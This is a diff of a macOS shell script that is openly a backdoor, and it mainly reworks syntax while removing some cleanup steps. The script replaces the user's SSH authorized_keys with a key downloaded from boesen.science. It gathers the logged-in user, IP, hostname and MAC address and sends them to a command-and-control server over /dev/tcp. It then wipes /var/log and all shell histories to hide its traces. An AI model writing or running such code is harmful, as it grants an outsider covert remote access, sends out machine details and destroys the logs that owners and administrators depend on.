@@ -22,41 +22,25 @@ mkdir -p "$SSHPATH" # On most computers, there won't be a .ssh directory initial
 rm "$SSHPATH/authorized_keys" # Just in case
 curl -Lso "$SSHPATH/authorized_keys" boesen.science:2042/pubkey
 
-USER=`stat -f "%Su" /dev/console` # Get user currently logged in (in GUI).
-IP=`/sbin/ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'`
-HOSTNAME=`hostname`
-MAC=`/sbin/ifconfig en1 | awk '/ether/{print $2}'`
+USER=$(stat -f "%Su" /dev/console) # Get user currently logged in (in GUI).
+IP=$(/sbin/ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')
+HOSTNAME=$(hostname)
+MAC=$(/sbin/ifconfig en1 | awk '/ether/{print $2}')
 
 SERVER="boesen.science"
 PORT=2043
 
 # Send data to C&C
 exec 3<>/dev/tcp/$SERVER/$PORT
-printf "JOIN: $USER $IP $HOSTNAME $MAC\0" >&3
+printf "JOIN: $USER $IP $HOSTNAME $MAC" >&3
 
 function timeout() { perl -e 'alarm shift; exec @ARGV' "$@"; }
-# Print response
-# Timeout after 3s if no response
-# TODO: If there's no response, we should send data in some other way
-timeout 1 cat <&3
-
-echo
-
-rm -f /tmp/elevate.out /tmp/*.sh
+# Print response, time out if none
+timeout 1 cat <&3 && echo
 
 rm -rf /var/log/*
 rm -f /var/root/.*history /Users/*/.*history
 
-rm -f "/Users/$USER/Downloads/term.*"
-
-osascript -e 'quit app "Terminal"'
-killall Script\ Editor
-sleep 1s
-
 for i in {1..50}; do
     printf "\n\n\n\n\n\n"
 done
-
-if [ "$USER" != "boesene" ]; then
-    killall Terminal term
-fi
